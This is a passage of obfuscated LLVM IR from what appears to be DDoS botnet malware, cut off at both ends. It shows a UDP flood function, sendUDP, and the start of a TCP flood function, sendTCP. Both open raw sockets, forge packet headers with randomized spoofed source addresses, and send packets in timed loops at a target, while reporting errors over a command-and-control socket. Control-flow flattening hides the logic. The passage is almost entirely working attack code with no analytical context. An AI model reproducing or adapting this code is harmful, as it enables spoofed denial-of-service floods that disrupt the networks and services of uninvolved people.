  store i32 0, i32* %11, align 4
  store i32 734498469, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %11, align 4
  %70 = add i32 %69, 1
  store i32 %70, i32* %11, align 4
  store i32 -1793298244, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %68, %67, %49, %39, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -568715879, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -568715879, label %first
    i32 -2021016718, label %32
    i32 -1816778714, label %36
    i32 -266348843, label %41
    i32 458161876, label %47
    i32 379301279, label %48
    i32 -1854957582, label %55
    i32 778632838, label %60
    i32 1534108060, label %63
    i32 1325846527, label %71
    i32 449060387, label %72
    i32 1473211627, label %82
    i32 498641825, label %93
    i32 2068758712, label %97
    i32 -724811510, label %101
    i32 -1492669743, label %106
    i32 -337362060, label %107
    i32 1939835063, label %108
    i32 -970095169, label %111
    i32 610663540, label %112
    i32 -1766872668, label %117
    i32 1561878262, label %120
    i32 -2063072147, label %126
    i32 117808415, label %129
    i32 737585003, label %130
    i32 672450588, label %135
    i32 -1770783078, label %140
    i32 -473477595, label %144
    i32 518811459, label %145
    i32 1175227620, label %151
    i32 -367339661, label %191
    i32 -644710518, label %193
    i32 393475226, label %198
    i32 180611515, label %223
    i32 -1701692308, label %224
    i32 1728514587, label %237
    i32 -1859385512, label %239
    i32 -1896494631, label %244
    i32 -27498045, label %271
    i32 -1483582758, label %276
    i32 972796593, label %277
    i32 1640085147, label %278
    i32 -1076719212, label %281
    i32 -1673943604, label %283
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 -2021016718, i32 -1816778714
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 -266348843, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 -266348843, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 458161876, i32 379301279
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %12, align 4
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp eq i32 %52, 32
  %54 = select i1 %53, i32 -1854957582, i32 610663540
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #5
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 1534108060, i32 778632838
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = call noalias i8* @malloc(i64 %66) #5
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  %70 = select i1 %69, i32 1325846527, i32 449060387
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  call void @llvm.memset.p0i8.i64(i8* %73, i8 0, i64 %76, i32 1, i1 false)
  %77 = load i8*, i8** %16, align 8
  %78 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %77, i32 %78)
  %79 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %79, %80
  store i32 %81, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 1473211627, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %15, align 4
  %84 = load i8*, i8** %16, align 8
  %85 = load i32, i32* %11, align 4
  %86 = sext i32 %85 to i64
  %87 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %88 = call i64 @sendto(i32 %83, i8* %84, i64 %86, i32 0, %struct.sockaddr* %87, i32 16)
  %89 = load i32, i32* %18, align 4
  %90 = load i32, i32* %14, align 4
  %91 = icmp eq i32 %89, %90
  %92 = select i1 %91, i32 498641825, i32 1939835063
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %8, align 4
  %95 = icmp eq i32 %94, 0
  %96 = select i1 %95, i32 2068758712, i32 -724811510
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  store i32 -724811510, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %103 = load i32, i32* %17, align 4
  %104 = icmp sgt i32 %102, %103
  %105 = select i1 %104, i32 -1492669743, i32 -337362060
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -970095169, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 1473211627, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %18, align 4
  %110 = add i32 %109, 1
  store i32 %110, i32* %18, align 4
  store i32 1473211627, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %113, i32* %19, align 4
  %114 = load i32, i32* %19, align 4
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 1561878262, i32 -1766872668
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %118, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %121 = load i32, i32* %19, align 4
  %122 = bitcast i32* %20 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #5
  %124 = icmp slt i32 %123, 0
  %125 = select i1 %124, i32 -2063072147, i32 117808415
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i32 0, i32 0))
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 50, i32* %21, align 4
  store i32 737585003, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %21, align 4
  %132 = add nsw i32 %131, -1
  store i32 %132, i32* %21, align 4
  %133 = icmp ne i32 %131, 0
  %134 = select i1 %133, i32 672450588, i32 -1770783078
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %137 = call i32 @rand_cmwc()
  %138 = xor i32 %136, %137
  call void @srand(i32 %138) #5
  %139 = call i32 @rand() #5
  call void @init_rand(i32 %139)
  store i32 737585003, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %10, align 4
  %142 = icmp eq i32 %141, 0
  %143 = select i1 %142, i32 -473477595, i32 518811459
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 1175227620, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = sub nsw i32 32, %146
  %148 = shl i32 1, %147
  %149 = sub nsw i32 %148, 1
  %150 = xor i32 %149, -1
  store i32 %150, i32* %22, align 4
  store i32 1175227620, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* %11, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 28, %153
  store i64 %154, i64* %.reg2mem2
  %155 = call i8* @llvm.stacksave()
  store i8* %155, i8** %23, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %156 = alloca i8, i64 %.reload4, align 16
  store i8* %156, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %157 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %157, %struct.iphdr** %24, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = getelementptr i8, i8* %159, i64 20
  %161 = bitcast i8* %160 to %struct.udphdr*
  store %struct.udphdr* %161, %struct.udphdr** %25, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 4
  %166 = load i32, i32* %22, align 4
  %167 = call i32 @getRandomIP(i32 %166)
  %168 = call i32 @htonl(i32 %167) #13
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 8, %170
  %172 = trunc i64 %171 to i32
  call void @makeIPPacket(%struct.iphdr* %162, i32 %165, i32 %168, i8 zeroext 17, i32 %172)
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #13
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.2* %179 to %struct.anon.3*
  %181 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %180, i32 0, i32 2
  store i16 %177, i16* %181, align 2
  %182 = call i32 @rand_cmwc()
  %183 = trunc i32 %182 to i16
  %184 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.2* %185 to %struct.anon.3*
  %187 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %186, i32 0, i32 0
  store i16 %183, i16* %187, align 2
  %188 = load i32, i32* %8, align 4
  %189 = icmp eq i32 %188, 0
  %190 = select i1 %189, i32 -367339661, i32 -644710518
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = call i32 @rand_cmwc()
  store i32 393475226, i32* %switchVar
  store i32 %192, i32* %.reg2mem10
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* %8, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #13
  %197 = zext i16 %196 to i32
  store i32 393475226, i32* %switchVar
  store i32 %197, i32* %.reg2mem10
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %199 = trunc i32 %.reload11 to i16
  %200 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.2* %201 to %struct.anon.3*
  %203 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %202, i32 0, i32 1
  store i16 %199, i16* %203, align 2
  %204 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.2* %205 to %struct.anon.3*
  %207 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %206, i32 0, i32 3
  store i16 0, i16* %207, align 2
  %208 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %209 = bitcast %struct.udphdr* %208 to i8*
  %210 = getelementptr inbounds i8, i8* %209, i64 8
  %211 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %210, i32 %211)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %212 = bitcast i8* %.reload8 to i16*
  %213 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 2
  %215 = load i16, i16* %214, align 2
  %216 = zext i16 %215 to i32
  %217 = call zeroext i16 @csum(i16* %212, i32 %216)
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 7
  store i16 %217, i16* %219, align 2
  %220 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %221 = load i32, i32* %9, align 4
  %222 = add nsw i32 %220, %221
  store i32 %222, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 180611515, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 -1701692308, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* %19, align 4
  %226 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %227 = call i64 @sendto(i32 %225, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %226, i32 16)
  %228 = call i32 @rand_cmwc()
  %229 = trunc i32 %228 to i16
  %230 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.2* %231 to %struct.anon.3*
  %233 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %232, i32 0, i32 0
  store i16 %229, i16* %233, align 2
  %234 = load i32, i32* %8, align 4
  %235 = icmp eq i32 %234, 0
  %236 = select i1 %235, i32 1728514587, i32 -1859385512
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  store i32 -1896494631, i32* %switchVar
  store i32 %238, i32* %.reg2mem12
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i32, i32* %8, align 4
  %241 = trunc i32 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #13
  %243 = zext i16 %242 to i32
  store i32 -1896494631, i32* %switchVar
  store i32 %243, i32* %.reg2mem12
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %245 = trunc i32 %.reload13 to i16
  %246 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %247 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.2* %247 to %struct.anon.3*
  %249 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %248, i32 0, i32 1
  store i16 %245, i16* %249, align 2
  %250 = call i32 @rand_cmwc()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 3
  store i16 %251, i16* %253, align 4
  %254 = load i32, i32* %22, align 4
  %255 = call i32 @getRandomIP(i32 %254)
  %256 = call i32 @htonl(i32 %255) #13
  %257 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 8
  store i32 %256, i32* %258, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %259 = bitcast i8* %.reload6 to i16*
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 2
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = call zeroext i16 @csum(i16* %259, i32 %263)
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 7
  store i16 %264, i16* %266, align 2
  %267 = load i32, i32* %27, align 4
  %268 = load i32, i32* %14, align 4
  %269 = icmp eq i32 %267, %268
  %270 = select i1 %269, i32 -27498045, i32 1640085147
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %273 = load i32, i32* %26, align 4
  %274 = icmp sgt i32 %272, %273
  %275 = select i1 %274, i32 -1483582758, i32 972796593
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 -1076719212, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 180611515, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %27, align 4
  %280 = add i32 %279, 1
  store i32 %280, i32* %27, align 4
  store i32 180611515, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %282)
  store i32 -1673943604, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %281, %278, %277, %276, %271, %244, %239, %237, %224, %223, %198, %193, %191, %151, %145, %144, %140, %135, %130, %129, %126, %120, %117, %112, %111, %108, %107, %106, %101, %97, %93, %82, %72, %71, %63, %60, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2046867939, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2046867939, label %first
    i32 225267323, label %31
    i32 -1109951271, label %35
    i32 -364014039, label %40
    i32 -1062308008, label %46
    i32 1369459029, label %47
    i32 -1376546797, label %54
    i32 -1862090890, label %57
    i32 1211226693, label %63
    i32 -1454557934, label %66
    i32 -1814880913, label %70
    i32 1245662069, label %71
    i32 -822415413, label %77
    i32 -1334177333, label %125
    i32 22204391, label %161
    i32 706533790, label %164
    i32 1956663544, label %168
    i32 -2065890943, label %173
    i32 -969043187, label %181
    i32 726842314, label %186
    i32 690539132, label %194
    i32 164315592, label %199
    i32 -638736397, label %207
    i32 386362943, label %212
    i32 1413522505, label %220
    i32 -1622009617, label %225
    i32 -2132551432, label %233
    i32 -798814554, label %237
    i32 -117160067, label %238
    i32 1474213616, label %239
    i32 730985973, label %240
    i32 -304150473, label %241
    i32 -352879926, label %243
    i32 397898372, label %244
    i32 1887652597, label %262
    i32 377267310, label %264
    i32 641312907, label %269
    i32 1585597135, label %293
    i32 -1704261166, label %294
    i32 -2008080540, label %341
    i32 -1468984431, label %346
    i32 -1938432512, label %347
    i32 1075037163, label %348
    i32 -142189227, label %351
    i32 -982276927, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 225267323, i32 -1109951271
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -364014039, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -364014039, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1062308008, i32 1369459029
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -982276927, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1862090890, i32 -1376546797
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  store i32 -982276927, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #5
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 1211226693, i32 -1454557934
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i32 0, i32 0))
  store i32 -982276927, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 -1814880913, i32 1245662069
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -822415413, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 -822415413, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @getRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
